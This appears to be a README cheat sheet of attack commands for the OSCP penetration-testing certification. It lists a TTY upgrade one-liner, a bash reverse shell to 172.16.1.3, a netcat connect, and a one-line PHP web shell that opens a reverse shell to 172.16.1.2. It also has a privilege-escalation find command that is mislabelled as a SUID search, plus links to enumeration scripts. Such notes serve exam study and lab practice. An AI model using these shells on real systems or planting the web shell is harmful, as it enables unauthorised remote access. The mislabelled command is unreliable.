# oscp-tools


# Upgrade Your Shellz

python -c 'import pty; pty.spawn("/bin/bash");'

# Alternative Shell

bash -i >& /dev/tcp/172.16.1.3/8080 0>&1

nc 172.16.1.2 443

# Tiny PHP Shell

<?php exec("/bin/bash -c 'bash -i > &/dev/tcp/172.16.1.2/8888 0>&1'"); ?>



# Priv Esc

Find SUID Files in /etc

find /etc -perm -2 -type f 2>/dev/null




List of tools and commands used for OSCP

Basic Priv Esc - Commands used in Unix Priv Esc

http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

Linux Priv Enum Script

http://www.rebootuser.com/?p=1758

Linux Priv Checker Python Script

http://www.securitysift.com/download/linuxprivchecker.py

Linux Cheet Sheet for Commands

https://www.isical.ac.in/~pdslab/2016/lectures/bash_cheat_sheet.pdf
